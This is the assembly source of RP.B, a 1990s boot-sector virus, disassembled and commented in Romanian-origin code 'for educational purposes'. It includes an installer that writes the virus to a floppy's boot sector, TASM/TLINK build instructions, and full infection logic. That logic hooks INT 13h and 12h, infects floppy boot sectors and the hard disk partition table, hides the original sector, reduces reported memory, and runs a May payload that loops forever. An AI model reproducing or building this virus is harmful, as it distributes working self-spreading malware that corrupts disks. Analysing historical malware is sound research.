; ===================================================
; = RP.B is a Romanian virus                        =
; = caught, disassembled and commented              =
; = by VMA soft in 1997 for educational purposes    =
; ===================================================

; RP.B is a Romanian virus that makes its visual appearance in May.
; If the current month is May, it displays the following message in
; an infinite loop: "Only bugs exist! RP 1995 Bucharest", causing no infections.
; If it is not May, then it infects the boot sectors of floppy disks
; and the hard disk partition table.
; The original sector with the partition table is copied to physical sector 14,
; side 0, cylinder 0 on hard disks or physical sector 14, side 1, cylinder 0
; on floppies with MediaByte=0F0h, or sector 3 on floppies with MediaByte<>0F0h.
; Normally, on a hard disk this sector is unused, and on floppies with
; MediaByte=0F0h this sector represents logical sector 31, i.e., the penultimate
; sector in the ROOT (usually the ROOT has 14 sectors).
; The virus copies itself into the last KByte of RAM reported by the BIOS and
; installs new routines to handle interrupts 13h and 12h.
; A counter is used to track how many times INT 13H has been accessed for
; purposes other than reading the MBR or BOOT. If this counter reaches 90,
; then INT 12H will return 640K of memory. The counter becomes 0 if the MBR
; or the BOOT of a floppy disk is accessed.
; NOTE: This program that installs the virus on a floppy disk does not copy
; sec0 to sec31. Therefore, upon booting from this floppy, you will probably
; receive a BIOS error message. The subsequent floppy disks that get accessed,
; as well as the hard disk, will benefit from a 'correct' infection.

; To assemble this virus proceed as follows:
;
;    - copy the virus into the file: RPBVIRUS.ASM
;    - run the command: TASM RPBVIRUS.ASM
;    - run the command: TLINK RPBVIRUS.OBJ /t
;
; A .COM file will be generated. When running it, you will be asked if
; you want to install the virus. If you answer yes, then you must insert a
; floppy disk into drive A:
;
; NOTE: This virus is not recognized by TBAV 7.07 but it is recognized by F-PROT 2.24c


.model tiny
.code
org 100h
entry:

;  =================================================
;  This part copies the BOOT sector onto disk A:
;  In this way, the RP virus is installed in the BOOT
;  =================================================

            lea     si, mes1
            call    AfisTxt    ; the introductory message is displayed

get_y_n:
            mov     ah,8       ; check if the user wants to install the virus
            int     21h
            cmp     al,'D'
            jz      yes
            cmp     al,'d'
            jz      yes
            cmp     al,'N'
            jz      no
            cmp     al,'n'
            jz      no
            jmp     get_y_n

yes:        xor     al,al      ; al = 0 - Disk A:
            mov     cx,1       ; cx = 1 - Number of sectors to write
            xor     dx,dx      ; dx = 0 - BOOT Sector
            push    ds
            lea     bx,RPVirus
            int     26h        ; write 512 bytes from ds:[bx]
            pop     ax         ; remove the extra leftover byte on the stack
            pop     ds
            jc      _Cont1
            lea     si, mes2
            call    AfisTxt
            xor     al,al            ; Return 0 for normal installation
            jmp     short _Cont2
_Cont1:     lea     si, mes3
            call    AfisTxt
            mov     al,1             ; Return 1 for error writing to disk A:
_Cont2:     mov     ah,4Ch
            int     21h

No:         lea     si, mes4
            call    AfisTxt
            mov     al,2             ; Return 2 for program interrupted by user
            jmp     short _Cont2

mes1:       db 'VMA RPVirus Installer . Versiunea 1.0 (c) VMA software', 0Ah, 0Dh
            db 'Doriti sa instalati virusul in sectorul de BOOT A: (D/N) ?',0Ah, 0Dh, 0
mes2:       db 'Sectorul de BOOT de pe discul A: a fost inlocuit cu succes.', 0Ah, 0Dh,0
mes3:       db 'Eroare la scriere pe discul A:', 0Ah, 0Dh,0
mes4:       db 'Program intrerupt de utilizator! Virusul nu s-a instalat !', 0Ah, 0Dh,0

;  =========================                ; displays the ASCIIZ string from
;   Subroutine to display                   ; address ds:[si]
;  =========================

AfisTxt     proc    near
            cld
Next1:
            lodsb                           ; String ds:[si] -> al
            or      al,al                   ; Zero?
            jnz     Next2                   ; Jump if not
            retn
Next2:
            push    si
            mov     ah,0Eh
            int     10h
            pop     si

            jmp     short Next1
AfisTxt     endp


;  ===================================
;  Here begins the code for the RP virus
;  ===================================

RPVirus      proc    near
FixPoint     equ     7C00h
ProgBegin    equ     $
NewInt13hHan equ     FixPoint+(offset NewInt13h)-ProgBegin
NewInt12hHan equ     FixPoint+(offset NewInt12h)-ProgBegin
Old13hVec    equ     FixPoint+(offset Old13h)-ProgBegin
Old12hVec    equ     FixPoint+(offset Old12h)-ProgBegin
BOOTHdr      equ     Fixpoint+(offset hdr)-ProgBegin
MBRecord     equ     FixPoint+(offset mesaj1)-ProgBegin
ContorNoRead equ     FixPoint+(offset Contor)-ProgBegin
MesajLunaMai equ     FixPoint+(offset mesajmai)-ProgBegin

            jmp     short start
            nop

Hdr:        db 'MSDOS5.0'      ; 8 bytes - OS name and version
            dw 512             ; Sector size in bytes
            db 1               ; Number of sectors/cluster
            dw 1               ; Sectors occupied up to the first FAT copy
            db 2               ; Number of FAT copies
            dw 224             ; Number of entries in the root directory: 224*32/512=14 sectors used by ROOT
            dw 2880            ; Total number of sectors on the disk: (2880*512-1457664)/512=33 reserved sectors
            db 0F0h            ; Disk type identical to the first byte in FAT (MediaByte)
            dw 9               ; Number of sectors/FAT copy
            dw 18              ; Number of sectors/track
            dw 2               ; Number of sides (read/write heads)
            dd 0               ; Number of sectors before the BOOT sector: for a floppy this is 0
            dd 0               ; Unused (Big total number of sectors)
            dw 0               ; Physical disk number
            db 29h             ; Extended boot sector signature
            db 02h,1Fh,61h,1Dh ; Serial number of the floppy
            db 'PCT9U_03-05'   ; 11 bytes - Disk label (Volume label)
            db 'FAT12   '      ; 8 bytes - File system identifier

            db 0FAh
Contor:     db 00h
Old13h:     db 54h,  0A2h, 00h, 0F0h
Old12h:     db 41h,  0F8h, 00h, 0F0h

Start:      push    cs
            pop     ds
            mov     ah,4
            int     1Ah                     ; get current month in DH

            cmp     dh,5
            jne     Nu_e_MAI
            jmp     LunaMai                 ; if it is May, jump to LunaMai
Nu_e_MAI:
            mov     bx,13h*04h              ; store INT 13h vector at Old13h
            mov     ax,[bx]
            mov     cs:Old13hVec,ax
            mov     bx,13h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old13hVec+2,ax

            mov     bx,12h*04h              ; store INT 12h vector at Old12h
            mov     ax,[bx]
            mov     cs:Old12hVec ,ax
            mov     bx,12h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old12hVec+2,ax

            mov     bh,04h
            mov     bl,13h                  ; BX = 0413h (Memory size in KBytes)
            mov     ax,[bx]
            dec     ax
            mov     [bx],ax                 ; Decrease the memory reported by BIOS at address 413h by 1K
            mov     cl,6                    ; Compute in AX the segment corresponding
            shl     ax,cl                   ; to the last K of memory in which the virus
            sub     ax,7C0h                 ; will be copied
            push    ax

            mov     bx,13h*04h+2
            mov     [bx],ax
            mov     bx,12h*04h+2
            mov     [bx],ax
            mov     bx,13h*04h
            mov     ax,NewInt13hHan         ; Set INT 13h vector to NewInt13h
            mov     [bx],ax
            mov     bx,12h*04h
            mov     ax,NewInt12hHan         ; Set INT 12h vector to NewInt12h
            mov     [bx],ax

            pop     ax                      ; AX = segment of the last KByte
            mov     si,FixPoint
            mov     di,si
            mov     es,ax
            mov     cx,512/2
            cld                             ; Copy the virus from 0:7C00h
            rep     movsw                   ; into the last KByte of memory

            int     19h                     ; Load the system

NewInt13h:  cmp     ah,2                    ; AH=2 Read sectors function
            jne     NoBOOTRead              ; Check if MasterBOOT or BOOT is being read at floppies
            cmp     cx,1                    ; or the BOOT sector on floppies
            jne     NoBOOTRead              ; To read, we need:
            cmp     dh,0                    ;  AX = 0201h ; CX = 1 ; DH = 00h
            jne     NoBOOTRead              ;  DL = 80h => HardDisk ; DL = 0 => FloppyDisk
            mov     byte ptr cs:ContorNoRead ,0 ; If that sector is read, then Contor=0
            pushf
            call    dword ptr cs:Old13hVec  ; Call the old INT 13h routine
            jc      loc_ret_7               ; JMP loc_ret_7 if read error
            cmp     word ptr es:[bx][offset VirusFlag-progbegin],0303h ; Check if the read sector is already infected
            je      loc_6                   ; If yes, read the original sector saved elsewhere (see Calcul)
            call    sub_1                   ; If no, then copy the original sector elsewhere (see Calcul)
            jnc     loc_3
            clc
            retf    2                       ; If write error, return from interrupt
loc_3:
            push    ds
            push    es
            pop     ds                      ; DS=ES
            push    cs
            pop     es                      ; ES=CS
            mov     si,bx
            add     si,1BEh
            mov     di,MBRecord
            mov     cx,66/2                 ; Copy 66 bytes from offset 1BEh relative to the read sector
            cld                             ; into the area with Mesaj1. (these 66 bytes are the Master Boot Record if HardDisk)
            rep     movsw
            mov     si,bx
            add     si,3
            mov     di,BOOTHdr
            mov     cx,60/2                 ; Copy 60 bytes from offset 3 relative to the read sector
            cld                             ; into the area with Hdr. (these 60 bytes are the BOOT data if it's a floppy)
            rep     movsw
            pop     ds
            mov     ax,0301h                ; Write to disk in sector 1
            mov     cx,1                    ; the memory area containing the virus
            mov     bx,FixPoint
            xor     dh,dh                   ; DH=0 -> Partition Table or Floppy Disk BOOT
            pushf
            call    dword ptr cs:Old13hVec
            retf    2

NoBOOTRead:
            cmp     byte ptr cs:ContorNoRead ,90
            je      loc_5
            inc     byte ptr cs:ContorNoRead
loc_5:
            jmp     dword ptr cs:Old13hVec


sub_1       proc    near                   ; Copies the original, non-infected sector
            call    Calcul                 ; to the new location returned by Calcul
            mov     ax,301h
            pushf
            call    dword ptr cs:Old13hVec
            retn
sub_1       endp

loc_6:      call    Calcul                 ; If the read sector (MB or BOOT) is already infected, then
            mov     ax,0201h               ; read sector 14 instead of MB on HardDisk, or
            pushf                          ; read sector 14 or 3 instead of BOOT on floppies
            call    dword ptr cs:Old13hVec
loc_ret_7:  retf    2


Calcul      proc    near                    ; Subroutine CALCUL returns:
            mov     cl,14                   ; CL=14        if MB HardDisk (DL>=80h)
            cmp     dl,80h                  ; CL=14 & DH=1 if floppy with MediaByte=0F0h
            jae     CalculRet               ; CL=3  & DH=1 if floppy with MediaByte<>0F0h
            mov     dh,1
            mov     al,es:[bx+15h]          ; ES:[BX+15h]=MediaByte
            cmp     al,0F0h
            je      CalculRet
            mov     cl,3
CalculRet:  retn
Calcul      endp


NewInt12h:  cmp     byte ptr cs:ContorNoRead ,90
            jne     cont1
            mov     ax,640
            iret
Cont1:      jmp     dword ptr cs:Old12hVec


MesajMai:   ;       Here is the following (MESSAGE) XOR 240
            ;       db  'Only bugs exist! ',10h
            ;       db  'RP 1995 Bucharest',0D4h
            db      0BFh, 9Eh,  9Ch,  89h,  0D0h, 92h,  85h,  97h,  83h
            db      0D0h, 95h,  88h,  99h,  83h,  84h,  0D1h, 0D0h, 0EAh
            db      0A2h, 0A0h, 0D0h, 0C1h, 0C9h, 0C9h, 0C5h, 0D0h, 0B2h
            db      85h,  93h,  98h,  91h,  82h,  95h,  83h,  84h,  '$'

LunaMai:    xor     ax,ax                   ; Set video mode 0
            int     10h

            mov     si,MesajLunaMai
            mov     bx,000Ah                ; BH=0 -> page 0 ; BL=10 -> color
            mov     cx,1                    ; How many times to display the character
            mov     dx,0A01h
Cont2:
            mov     ah,2
            inc     dl                      ; Cursor coordinates: DH=10;DL=2
            int     10h                     ; Position cursor at (R=10,C=2)

            mov     ah,9                    ; Write character and attribute at cursor
            lodsb                           ; Get each character from MesajMai
            cmp     al,'$'
            je      Cont3
            xor     al,240                  ; Decode: CHARACTER XOR 240
            int     10h                     ; Display character
            jmp     short Cont2

Cont3:      mov     cx,0FFFFh
Delay:      loop    Delay                   ; Creates a delay
            jmp     short LunaMai           ; Infinite loop: <Set mode 0; Display Txt; Delay>

VirusFlag:  db      03h, 03h                ; Virus signature in the sector
Mesaj1:     db      0Ah,'Replace and press any key when ready', 0Dh, 0Ah, 0
            db      'IO      SYS'
            db      'MSDOS   SYS'

progend     equ     $
            db      00h,000h
            db      55h,0AAh                ; Sector signature for MB or BOOT

            RPVirus endp

            end     entry
